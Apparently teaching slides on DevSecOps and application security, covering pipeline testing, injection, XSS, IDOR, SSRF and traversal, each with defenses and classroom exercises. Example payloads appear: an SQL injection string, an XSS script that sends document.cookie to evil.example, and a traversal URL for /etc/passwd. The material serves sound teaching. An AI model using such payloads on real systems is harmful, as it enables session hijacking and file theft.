⚙️ What is DevSecOps?

DevSecOps integrates security into DevOps. Security is a shared responsibility throughout the SDLC (“shift left”), with automated checks and continuous monitoring aligned to CI/CD.

🚀 Real-World Example: CI/CD Pipeline Security

On each commit, the pipeline triggers SAST, SCA (dependency scanning), DAST, and policy checks; failures block promotion to staging/production and feed tickets to remediation.

API Security

APIs are prime targets; secure design and controls are critical.

Key API Security Controls

  • Authentication & Authorization: Strong authN; granular authZ (BOLA/BOPLA aware).
  • Data Scoping: Return only necessary fields; avoid mass assignment.
  • Rate Limiting: Throttle abusive clients to prevent DoS and cost spikes.
  • Input Filtering: Validate all inputs and schemas.
  • Monitoring & Logging: Trace IDs; detect anomalies; retain logs for IR.

Software Security Testing

Static Analysis (SAST)

Analyze source/bytecode without executing; find code-level flaws early.

Dynamic Analysis (DAST)

Probe running apps for vulns at runtime via interfaces.

Fuzzing

Send unexpected data to trigger crashes or undefined behavior.

📦 Software Composition Analysis (SCA)

Continuously scan dependencies (SBOM), flag known CVEs, and enforce update policies.

👀 Code Review & Testing Strategy

Peer review, unit/integration tests, and regression suites tied to security requirements.

Injection Vulnerabilities: SQLi

💉 SQL Injection (SQLi)

Occurs when user input is inserted into queries without proper parameterization. Example: ' OR 1=1;--.

🚨 Real-World Example: MOVEit Transfer Exploitation (2023)

The Cl0p group exploited a critical SQLi in MOVEit Transfer. Public tallies attribute impacts to >2,500 organizations and roughly ~93 million individuals, demonstrating supply-chain blast radius when widely used software has a single flaw.

🛡️ Defenses

  • Use parameterized queries / prepared statements (bind variables) — never string concatenation.
  • Prefer safe ORM/query builders; validate identifiers server-side with allow lists.
  • Grant least-privilege DB roles; separate read vs. write accounts.
  • Apply input validation and constrain query shape; monitor with SAST/DAST and WAF virtual patching.

Other Injection Attacks

Command Injection

Unsafely concatenated input executes OS commands.

LDAP Injection

Manipulates directory queries to bypass authZ or enumerate data.

XML/XXE Injection

Abuses XML parsers; may read files or SSRF via external entities.

Injection Vulnerabilities: XSS

🎭 Cross-Site Scripting (XSS)

Malicious scripts run in victims’ browsers due to improper output encoding.

Reflected XSS

Payload comes from the current request (e.g., crafted link).

Stored (Persistent) XSS

Payload is stored server-side (e.g., comments) and served to users.

🛡️ Defenses

  • Contextual output encoding (HTML/attr/JS/URL) and auto-escaping templates.
  • Content Security Policy with nonces; avoid inline event handlers.
  • Sanitize only when rich HTML is required; otherwise store & render as plain text.
  • Cookies: HttpOnly (limits theft), Secure, SameSite.

Memory and Timing Attacks

🌊 Buffer Overflow

Overwrites memory to alter control flow (a.k.a. memory injection).

🏃 Race Condition (TOCTTOU)

Mismatch between Time-of-Check and Time-of-Use on the Target of Evaluation (TOE).

🧩 Null Pointer Dereference

Dereferencing null can crash apps (info leakage) or, in rare designs, bypass checks. Validate inputs and handle exceptions safely.

🚨 Real-World Example: "Dirty COW" (CVE-2016-5195)

A race condition in the Linux kernel enabled local privilege escalation to root by exploiting copy-on-write behavior.

Other Application Attacks

🔁 Replay Attacks

Captured credentials or session tokens are reused to impersonate users. Mitigate with MFA, short-lived/nonce-based tokens, TLS, and clock-aware server checks.

⬆️ Privilege Escalation

Abusing flaws/misconfigs to gain higher privileges (e.g., vulnerable services, reused hashes). Enforce least privilege, patch promptly, and add exploit mitigations (ASLR/DEP).

Session & Request Forgery Attacks

🍪 Session Hijacking

Stealing/abusing session cookies to impersonate users.

  • Cookie flags: Secure, HttpOnly, SameSite
  • Rotate/expire on privilege change; bind to device/IP as appropriate.

Cross-Site Request Forgery (CSRF)

Tricks a logged-in browser into sending unwanted requests. Use anti-CSRF tokens and SameSite cookies.

☁️ Server-Side Request Forgery (SSRF)

Forces the server to fetch internal resources (e.g., cloud metadata). Egress filtering and allow lists reduce risk.

🛡️ Defense Playbook

  • Sessions: Secure + HttpOnly + SameSite; rotate on login/priv-change; short TTL.
  • CSRF: Anti-CSRF tokens, Origin/Referer validation, re-auth for sensitive operations.
  • SSRF: Egress allow lists; block link-local/metadata IPs; strict URL parsing; disable redirects; segment networks; enforce IMDSv2.
  • Transport: Enforce HTTPS (HSTS) and consider mTLS for internal service-to-service calls.

Authorization Flaw: IDOR

💔 Insecure Direct Object References (IDOR)

Direct object access via user-controlled identifiers without proper authZ checks.

Example

User at /invoices?id=123 changes to /invoices?id=124 and accesses another user’s data.

🛡️ Defenses

  • Object-level authorization on every access (ownership/ACL checks) — deny by default.
  • Use indirect references (opaque IDs) and scope queries by current user/tenant.
  • Log and alert on access to objects not owned by the caller; rate-limit enumeration attempts.

Authorization Flaw: Directory Traversal

📂 Directory Traversal

Using ../ to escape the intended path and read sensitive files.

File Inclusion (LFI/RFI)

Including files for execution rather than display may lead to remote code execution.

🛡️ Defenses

  • Canonicalize (e.g., realpath) and verify the resolved path stays under the allowed base directory.
  • Enforce allow-listed filenames/IDs; reject ../, encoded traversal, and path separators.
  • Filesystem hardening: non-privileged user, read-only asset dirs, no symlink follow, chroot/jail/container; SELinux/AppArmor confinement.

Application Security Controls

Web Application Firewall (WAF)

Layer-7 filtering to block common attacks (SQLi/XSS); virtual patching for emergent CVEs.

Runtime App Self-Protection (RASP)

In-process hooks to detect/block exploits at runtime (e.g., deserialization, command injection).

Security Headers & CSP

CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy to harden browsers.

Rate Limiting & Bot Mitigation

Per-IP/user quotas, CAPTCHAs or bot signals; protect login/API endpoints from abuse.

Secrets Management

Central vault/KMS; rotation; no secrets in code or images; just-in-time credentials.

Centralized Input Validation

Shared validation libraries/gateways; canonicalization and strict allow lists.

mTLS & Service Auth

Mutual TLS between services; signed tokens (OIDC/JWT) with short lifetimes.

IAM, RBAC/ABAC & PEP

Central policy decision/enforcement; deny-by-default; least privilege at every layer.

Egress Control & Segmentation

Restrict outbound calls; block link-local/metadata; segment networks to contain SSRF.

Code Integrity and Automation

🔑 Code Security Practices

  • Code Signing: Authenticate publisher; verify integrity on install/run.
  • No Hard-Coded Secrets: Use vault/KMS; inject via env/CI; rotate keys.
  • Package Hygiene: SCA, version pinning, private registries, SBOMs.
  • Update Integrity: Signed update channels; checksum verification; rollback plans.
  • Build Provenance: Reproducible builds; signed artifacts; isolated runners.

🤖 Automation: Use Cases & Considerations

  • Use cases: CI policy gates, IaC guardrails, least-privilege provisioning, ticketing, incident enrichment.
  • Benefits: Consistency, speed, scale, measurable baselines.
  • Considerations: Complexity/SPOF, cost, false positives, technical debt, supportability.

🤔 Think–Pair–Share — Part 1

Scenario: A Busy Comment Thread

A popular blog allows users to post comments. One post contains user-supplied content that is rendered back into the page. An attacker posts a comment that includes the following snippet:

<script>document.location='http://evil.example/steal?c=' + document.cookie</script>

Your Task (5–7 minutes)

  • Identify the vulnerability class and where untrusted input is being handled.
  • List two realistic impacts on end users or the application.
  • Propose one server-side control and one client-side/browser control to mitigate this risk.
  • Optional: How would stronger session handling change the likelihood or impact?

🔬 Think–Pair–Share — Part 2

Scenario: File Viewer Endpoint

A website displays images via a query parameter:

https://example.com/view.php?file=profile_pic.jpg

An attacker crafts a link and convinces a user to click it:

https://example.com/view.php?file=../../../../etc/passwd

Your Task (5–7 minutes)

  1. Name the vulnerability and the immediate input-handling failure.
  2. Explain the goal of the path segments and what data the attacker is trying to access.
  3. Propose two mitigations: one input validation/canonicalization approach and one filesystem/OS-level control.
  4. Optional: What logs/alerts would help you detect attempts like this in production?

Chapter Summary

🔒 Security is a Lifecycle Responsibility

Integrate security into every SDLC phase—from requirements to decommissioning.

✅ Validate, Encode, Authorize

Most web vulns trace to untrusted input and weak authZ. Validate/encode output and enforce least privilege.

⚙️ Automate Testing & Supply Chain Hygiene

SAST/DAST/Fuzzing + SCA in CI/CD catch issues early; signed updates and SBOMs reduce supply-chain risk.

🚨 Bottom Line

Every line of code is potential attack surface. Defense-in-depth, automation, and secure-by-default design build resilience.
